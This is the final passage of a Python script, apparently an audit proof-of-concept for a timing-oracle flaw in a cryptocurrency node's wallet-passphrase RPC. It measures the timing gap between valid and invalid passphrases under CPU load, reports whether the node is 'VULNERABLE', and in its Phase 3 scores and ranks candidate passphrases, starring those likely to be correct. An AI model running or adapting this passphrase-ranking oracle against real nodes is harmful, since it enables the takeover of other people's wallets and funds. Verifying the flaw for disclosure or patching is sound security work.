            load_fraction=load_frac,
            num_samples=args.samples,
            load_duration=args.load_duration,
            wallet=args.rpc_wallet,
            verbose=args.verbose)

        load_results.append(result)

        inv_ms = result['invalid_mean_ns'] / 1e6
        print(f'    Invalid mean: {inv_ms:.3f} ms')

        if result.get('valid_mean_ns') is not None:
            val_ms = result['valid_mean_ns'] / 1e6
            ratio = result['gap_ratio']
            t_stat = result['t_statistic']
            p_val = result['p_value']
            print(f'    Valid mean:   {val_ms:.3f} ms')
            print(f'    Gap ratio:    {ratio:.4f}×')
            print(f'    t-statistic:  {t_stat:.4f}')
            print(f'    p-value:      {p_val:.4e}')

            if ratio >= GAP_RATIO_CRITICAL:
                print(f'    [!!] CRITICAL: Gap ratio {ratio:.2f}× exceeds '
                      f'{GAP_RATIO_CRITICAL}× threshold!')
                print(f'         Matches audit finding for 0.19.0.1 (9.5×)')
            elif ratio >= GAP_RATIO_WARNING:
                print(f'    [!] WARNING: Gap ratio {ratio:.2f}× exceeds '
                      f'{GAP_RATIO_WARNING}× threshold!')
        else:
            print(f'    (valid baseline not available — no known-correct passphrase)')

    # ── Phase 2: ASCII graph ──
    gap_ratios = [r['gap_ratio'] for r in load_results
                  if r.get('gap_ratio') is not None]
    load_levels_with_ratio = [r['load_fraction'] for r in load_results
                              if r.get('gap_ratio') is not None]

    if gap_ratios:
        print(f'\n  {"═" * 58}')
        print(f'  GAP RATIO vs CPU LOAD')
        print(f'  {"═" * 58}')
        print(ascii_bar_graph(load_levels_with_ratio, gap_ratios))
    else:
        print(f'\n  [!] No gap ratios computed (no valid passphrase provided)')
        # Show invalid-timing gradient instead
        print(f'\n  {"═" * 58}')
        print(f'  INVALID-TIMING GRADIENT (load-dependent)')
        print(f'  {"═" * 58}')
        for r in load_results:
            inv_ms = r['invalid_mean_ns'] / 1e6
            print(f'    Load {r["load_fraction"]:>5.0%}: '
                  f'invalid_mean = {inv_ms:.3f} ms')
        if len(load_results) >= 2:
            first_ms = load_results[0]['invalid_mean_ns'] / 1e6
            last_ms = load_results[-1]['invalid_mean_ns'] / 1e6
            gradient = last_ms / first_ms if first_ms > 0 else 0
            print(f'\n    Gradient (last/first): {gradient:.2f}×')
            if gradient > 2.0:
                print(f'    [!] Significant load-dependent timing variation detected.')
                print(f'        This may leak information about wallet state.')

    # ── Phase 3: Candidate scoring ──
    candidate_scores = None
    if args.candidates and args.known_correct:
        print(f'\n  {"═" * 58}')
        print(f'  PHASE 3: CANDIDATE SCORING (Timing Oracle Under Load)')
        print(f'  {"═" * 58}')

        # Use the highest-load result for scoring reference
        high_load = [r for r in load_results
                     if r.get('gap_ratio') is not None]
        if high_load:
            ref = max(high_load, key=lambda x: x['load_fraction'])
            valid_ref = ref['valid_mean_ns']
            invalid_ref = ref['invalid_mean_ns']
            ref_ratio = ref['gap_ratio']

            print(f'  [*] Reference load level: {ref["load_fraction"]:.0%}')
            print(f'  [*] Reference gap ratio: {ref_ratio:.4f}×')
            print(f'  [*] Valid reference: {valid_ref / 1e6:.3f} ms')
            print(f'  [*] Invalid reference: {invalid_ref / 1e6:.3f} ms')
            print(f'  [*] Scoring {len(args.candidates)} candidate(s)...\n')

            candidate_scores = score_candidates(
                args.rpc_host, args.rpc_port, args.rpc_user, args.rpc_pass,
                args.candidates,
                valid_ref, invalid_ref, ref_ratio,
                args.samples,
                wallet=args.rpc_wallet,
                verbose=args.verbose)

            # Print ranked results
            print(f'\n  {"═" * 58}')
            print(f'  CANDIDATE RANKING')
            print(f'  {"═" * 58}')
            print(f'  {"Rank":<6}{"Candidate":<25}{"Mean (ms)":<12}'
                  f'{"Score":<10}{"t-stat":<10}')
            print(f'  {"─" * 63}')
            for rank, cs in enumerate(candidate_scores, 1):
                cand_display = cs['candidate'][:22]
                if len(cs['candidate']) > 22:
                    cand_display += '...'
                marker = ' ★' if cs['score'] > 0.7 else ''
                print(f'  {rank:<6}{cand_display:<25}{cs["mean_ms"]:<12.3f}'
                      f'{cs["score"]:<10.4f}{cs["t_statistic"]:<10.2f}{marker}')
            print(f'  {"─" * 63}')
            print(f'  ★ = high likelihood of being the correct passphrase')
        else:
            print(f'  [!] No valid reference data available for scoring')
    elif args.candidates and not args.known_correct:
        print(f'\n  [!] Candidate scoring requires --known-correct passphrase')
        print(f'      to establish the valid-timing reference distribution.')

    # ── Phase 4: JSON report ──
    if args.output_json:
        print(f'\n  {"═" * 58}')
        print(f'  JSON REPORT')
        print(f'  {"═" * 58}')
        generate_report(
            node_version, wallet_info, cpu_count,
            load_results, candidate_scores,
            args.output_json)

    # ── Final summary ──
    print(f'\n  {"═" * 58}')
    print(f'  ANALYSIS COMPLETE')
    print(f'  {"═" * 58}')
    print(f'  Finding:              {FINDING_ID}')
    print(f'  Related:              {ENTROPY_FINDING}')
    print(f'  Affected versions:    {", ".join(AFFECTED_VERSIONS)}')
    print(f'  Node version:         {node_version or "unknown"}')
    print(f'  CPU cores:            {cpu_count}')
    print(f'  Load levels tested:   {len(load_fractions)}')

    if gap_ratios:
        max_ratio = max(gap_ratios)
        print(f'  Max gap ratio:        {max_ratio:.4f}×')
        if max_ratio >= GAP_RATIO_CRITICAL:
            print(f'  [!!] CRITICAL: Amplification ratio {max_ratio:.2f}× '
                  f'exceeds {GAP_RATIO_CRITICAL}× threshold!')
            print(f'       This node is VULNERABLE to the CPU load '
                  f'amplification timing oracle.')
            print(f'       An attacker can distinguish correct passphrase '
                  f'candidates under load.')
        elif max_ratio >= GAP_RATIO_WARNING:
            print(f'  [!] WARNING: Amplification ratio {max_ratio:.2f}× '
                  f'exceeds {GAP_RATIO_WARNING}× threshold.')
            print(f'       This node shows significant timing amplification '
                  f'under CPU load.')
        else:
            print(f'  [*] Gap ratio below warning threshold ({GAP_RATIO_WARNING}×).')
            print(f'       This node may not be affected, or the load levels '
                  f'tested were insufficient.')
    else:
        print(f'  Max gap ratio:        N/A (no valid passphrase provided)')

    if candidate_scores:
        top = candidate_scores[0]
        print(f'  Top candidate:        "{top["candidate"]}" '
              f'(score={top["score"]:.4f})')

    print(f'  {"═" * 58}')


if __name__ == '__main__':
    main()
